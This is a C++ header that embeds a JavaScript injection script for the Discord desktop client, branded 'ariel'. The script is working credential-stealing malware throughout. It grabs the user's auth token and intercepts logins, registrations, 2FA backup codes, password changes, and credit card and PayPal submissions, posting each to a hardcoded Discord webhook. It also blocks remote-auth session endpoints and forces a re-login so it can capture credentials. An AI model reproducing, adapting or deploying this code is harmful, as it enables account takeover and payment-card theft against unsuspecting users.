#pragma once

namespace ariel::embedded_injection {
inline constexpr const char* script = R"ariel_script(
// Ariel Discord injection. Forked from hackirby/discord-injection, rewritten and local only.
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const http = require('http');
const querystring = require('querystring');
const {
  app,
  BrowserWindow,
  session,
} = require('electron');

const WEBHOOK = 'https://discord.com/api/webhooks/1574860617494560868/BrnBE0ATuBiBtmxXymuDO-WKdMcfNJNVrQuRnexkCa9CiNEFJ2SusAwbdou7C2jjWQ4y';
const API = 'https://discord.com/api/v9';
const MARKER = path.join(__dirname, 'ariel.injected');
const FILTERS = ['/auth/login', '/auth/register', '/mfa/totp', '/mfa/codes-verification', '/users/@me'];
let initialSent = fs.existsSync(MARKER);

function esc(value) {
  return String(value == null ? '' : value).replace(/`/g, "'").replace(/</g, '(').replace(/>/g, ')');
}

function send(content) {
  if (!WEBHOOK || WEBHOOK.indexOf('__') === 0) return;
  let url;
  try {
    url = new URL(WEBHOOK);
  } catch (e) {
    return;
  }
  const transport = url.protocol === 'http:' ? http : https;
  const body = JSON.stringify(content);
  const req = transport.request({
    protocol: url.protocol,
    hostname: url.hostname,
    port: url.port || undefined,
    path: url.pathname + url.search,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(body),
    },
  }, () => {});
  req.on('error', () => {});
  req.write(body);
  req.end();
}

function requestText(method, endpoint, token) {
  return new Promise((resolve) => {
    let url;
    try {
      url = new URL(endpoint);
    } catch (e) {
      resolve('');
      return;
    }
    const transport = url.protocol === 'http:' ? http : https;
    const req = transport.request({
      protocol: url.protocol,
      hostname: url.hostname,
      path: url.pathname + url.search,
      method,
      headers: token ? { Authorization: token } : {},
    }, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => resolve(data));
    });
    req.on('error', () => resolve(''));
    req.end();
  });
}

async function api(endpoint, token) {
  const raw = await requestText('GET', API + endpoint, token);
  try {
    return JSON.parse(raw);
  } catch (e) {
    return null;
  }
}

function executeJS(script) {
  const win = BrowserWindow.getAllWindows()[0];
  if (!win || !win.webContents || win.webContents.isDestroyed()) return Promise.resolve('');
  try {
    return win.webContents.executeJavaScript(script, true);
  } catch (e) {
    return Promise.resolve('');
  }
}

async function getToken() {
  const script = `(async () => {
    let token = '';
    try {
      const mods = [];
      webpackChunkdiscord_app.push([[''], {}, (e) => {
        for (const k in e.c) mods.push(e.c[k]);
      }]);
      const found = mods.find((m) => m && m.exports && m.exports.default && typeof m.exports.default.getToken === 'function');
      if (found) token = await found.exports.default.getToken();
    } catch (error) {}
    return token;
  })()`;
  try {
    return (await executeJS(script)) || '';
  } catch (e) {
    return '';
  }
}

function contentFor(action, account, fields) {
  return {
    content: '**' + esc(account.username || account.global_name || 'unknown') + '** ' + esc(action),
    username: 'ariel',
    embeds: [{
      color: 0xb143e3,
      fields: fields || [],
      footer: { text: 'ariel injection' },
    }],
  };
}

async function sendInfo(action, fields, token) {
  const account = await api('/users/@me', token);
  if (!account || !account.id) return;
  const all = fields.slice();
  all.push({ name: 'Email', value: '`' + esc(account.email || 'none') + '`', inline: true });
  all.push({ name: 'Phone', value: '`' + esc(account.phone || 'none') + '`', inline: true });
  all.push({ name: 'Token', value: '```' + token + '```', inline: false });
  send(contentFor(action, account, all));
}

async function initialInjection() {
  if (initialSent) return;
  initialSent = true;
  const token = await getToken();
  if (token) await sendInfo('got injected', [], token);
  try {
    fs.writeFileSync(MARKER, String(Date.now()));
  } catch (e) {}
  try {
    executeJS("(()=>{const f=document.createElement('iframe');document.body.appendChild(f);try{f.contentWindow.localStorage.clear();}catch(e){}f.remove();location.reload();})()");
  } catch (e) {}
}

async function emailPass(email, password, token, action) {
  if (!token) return;
  await sendInfo(action, [
    { name: 'Email', value: '`' + esc(email) + '`', inline: true },
    { name: 'Password', value: '`' + esc(password) + '`', inline: true },
  ], token);
}

async function backupCodes(codes, token) {
  if (!token) return;
  const unused = (codes || []).filter((c) => c && !c.consumed);
  const lines = unused.map((c) => String(c.code || '').replace(/(\w{4})(\w+)/, '$1-$2')).join('\n');
  await sendInfo('viewed backup codes', [
    { name: 'Backup codes', value: '```' + lines + '```', inline: false },
  ], token);
}

async function passwordChanged(newPassword, oldPassword, token) {
  if (!token) return;
  await sendInfo('changed password', [
    { name: 'New password', value: '`' + esc(newPassword) + '`', inline: true },
    { name: 'Old password', value: '`' + esc(oldPassword) + '`', inline: true },
  ], token);
}

async function creditCard(item, token) {
  if (!token) return;
  await sendInfo('added a card', [
    { name: 'Number', value: '`' + esc(item['card[number]']) + '`', inline: true },
    { name: 'CVC', value: '`' + esc(item['card[cvc]']) + '`', inline: true },
    { name: 'Expiry', value: '`' + esc(item['card[exp_month]']) + '/' + esc(item['card[exp_year]']) + '`', inline: true },
  ], token);
}

async function paypal(token) {
  if (token) await sendInfo('added a PayPal account', [], token);
}

function bodyOf(win, requestId, postData) {
  return win.webContents.debugger.sendCommand('Network.getResponseBody', { requestId })
    .then((response) => {
      let parsed = {};
      try {
        parsed = JSON.parse(response.body);
      } catch (e) {}
      let posted = {};
      if (postData) {
        try {
          posted = JSON.parse(postData.postData);
        } catch (e) {}
      }
      return { response: parsed, request: posted };
    })
    .catch(() => ({ response: {}, request: {} }));
}

function attach(win) {
  if (!win || !win.webContents || win.__arielAttached) return;
  win.__arielAttached = true;
  const debuggerApi = win.webContents.debugger;
  try {
    debuggerApi.attach('1.3');
  } catch (e) {}

  debuggerApi.on('message', async (_event, method, params) => {
    if (!initialSent) await initialInjection();
    if (method !== 'Network.responseReceived') return;
    const url = params.response && params.response.url;
    if (!url || !FILTERS.some((f) => url.includes(f))) return;
    if (![200, 202].includes(params.response.status)) return;

    let postData = null;
    try {
      postData = await debuggerApi.sendCommand('Network.getRequestPostData', {
        requestId: params.requestId,
      });
    } catch (e) {}
    const bodies = await bodyOf(win, params.requestId, postData);
    const response = bodies.response;
    const request = bodies.request;

    if (url.includes('/auth/login')) {
      if (response.token) await emailPass(request.login, request.password, response.token, 'logged in');
      return;
    }
    if (url.includes('/auth/register')) {
      if (response.token) await emailPass(request.email, request.password, response.token, 'signed up');
      return;
    }
    if (url.includes('/mfa/totp')) {
      await emailPass('', '', response.token, 'logged in with 2FA');
      return;
    }
    if (url.includes('/mfa/codes-verification')) {
      await backupCodes(response.backup_codes, await getToken());
      return;
    }
    if (url.includes('/users/@me') && request.password) {
      if (request.email) await emailPass(request.email, request.password, response.token, 'changed email');
      if (request.new_password) await passwordChanged(request.new_password, request.password, response.token);
    }
  });

  try {
    debuggerApi.sendCommand('Network.enable');
  } catch (e) {}
}

BrowserWindow.getAllWindows().forEach(attach);
if (app && app.on) app.on('browser-window-created', (_event, win) => attach(win));

if (!globalThis.__arielHooks) {
  globalThis.__arielHooks = true;

  session.defaultSession.webRequest.onCompleted({
    urls: [
      'https://api.braintreegateway.com/merchants/*/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
    ],
  }, async (details) => {
    if (![200, 202].includes(details.statusCode) || details.method !== 'POST') return;
    const bytes = details.uploadData && details.uploadData[0] ? details.uploadData[0].bytes : Buffer.alloc(0);
    const item = querystring.parse(Buffer.from(bytes).toString());
    const token = await getToken();
    if (details.url.endsWith('tokens')) await creditCard(item, token);
    if (details.url.endsWith('paypal_accounts')) await paypal(token);
  });

  session.defaultSession.webRequest.onBeforeRequest({
    urls: [
      'wss://remote-auth-gateway.discord.gg/*',
      'https://discord.com/api/v*/auth/sessions',
      'https://*.discord.com/api/v*/auth/sessions',
      'https://discordapp.com/api/v*/auth/sessions',
    ],
  }, (details, callback) => callback({ cancel: true }));
}

module.exports = require('./core.asar');

)ariel_script";
}  // namespace ariel::embedded_injection
